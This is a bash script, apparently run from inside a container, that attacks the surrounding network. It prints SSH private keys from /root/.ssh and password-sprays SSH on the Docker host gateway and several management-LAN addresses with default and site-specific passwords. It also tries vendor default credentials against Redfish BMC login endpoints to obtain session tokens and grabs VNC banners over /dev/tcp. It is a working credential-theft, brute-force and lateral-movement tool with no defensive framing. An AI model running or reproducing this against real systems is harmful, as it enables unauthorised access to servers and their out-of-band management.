#!/bin/bash
set +e
echo "###P27START $(date -u)"
echo "=== CT-SSH-KEYS ==="; ls -la /root/.ssh 2>&1; for f in /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.ssh/authorized_keys /root/.ssh/config; do [ -f "$f" ] && echo "--- $f" && head -c 400 "$f"; done
echo "=== HOSTSSH-SPRAY ==="
for u in root ubuntu oneai onething admin; do for pw in '/&S2)n@W1G' admin 123456 onething 'Onething@2024' Aa123456 oneai root password; do
  r=$(timeout 9 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@172.17.0.1 'id;hostname;nvidia-smi -L|head -9' 2>&1 | tail -2 | tr '\n' '|')
  case "$r" in *denied*|*"timed out"*|*refused*|"") ;; *) echo "HIT $u:$pw :: ${r:0:170}";; esac
done; done
echo "=== MGMT-LAN-SSH-SPRAY ==="
for ip in 192.168.2.36 192.168.2.37 192.168.2.38 192.168.2.39 192.168.2.40 192.168.2.41 192.168.2.63 192.168.2.72; do
  for u in root ubuntu; do for pw in '/&S2)n@W1G' admin 123456 onething 'Onething@2024' root toor; do
    r=$(timeout 8 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@$ip 'id;hostname;nvidia-smi -L|head -3' 2>&1 | tail -1)
    case "$r" in *denied*|*"timed out"*|*refused*|*unreachable*|"") ;; *) echo "HIT $ip $u:$pw :: ${r:0:140}";; esac
  done; done
done
echo "=== REDFISH-ID ==="
for ip in 192.168.2.83 192.168.2.90 192.168.2.92 192.168.2.93 192.168.2.181; do
  printf "%s root: " "$ip"; curl -sk -m 6 "https://$ip/redfish/v1/" | head -c 300; echo
  printf "%s sys: " "$ip"; curl -sk -m 6 -o /dev/null -w "c=%{http_code}\n" "https://$ip/redfish/v1/Systems"
done
echo "=== REDFISH-SESSION-TRY ==="
for ip in 192.168.2.92 192.168.2.93 192.168.2.83; do
  for cred in "ADMIN:ADMIN" "admin:admin" "root:calvin" "ADMIN:Password1234!" "Administrator:Password1234!" "admin:password" "root:root" "superuser:superuser" "ADMIN:superuser"; do
    u=${cred%%:*}; p=${cred#*:}
    r=$(curl -sk -m 6 -D /tmp/rh.$$ -o /tmp/rb.$$ -X POST -H "Content-Type: application/json" -d "{\"UserName\":\"$u\",\"Password\":\"$p\"}" "https://$ip/redfish/v1/SessionService/Sessions")
    tok=$(grep -i 'x-auth-token' /tmp/rh.$$ | tr -d '\r' | cut -d' ' -f2)
    code=$(head -1 /tmp/rh.$$ | tr -d '\r')
    echo "$ip $u :: $code tok=${tok:0:12} body=$(head -c 80 /tmp/rb.$$ | tr '\n' ' ')"
  done
done
echo "=== VNC-PROBE ==="
for hp in 192.168.2.36:5901 192.168.2.41:5900 192.168.2.45:5900 192.168.2.63:5900; do h=${hp%%:*}; p=${hp##*:}; printf "%s " "$hp"; timeout 5 bash -c "exec 3<>/dev/tcp/$h/$p; head -c 12 <&3" 2>&1 | tr -d '\r'; echo; done
echo "###P27END $(date -u)"
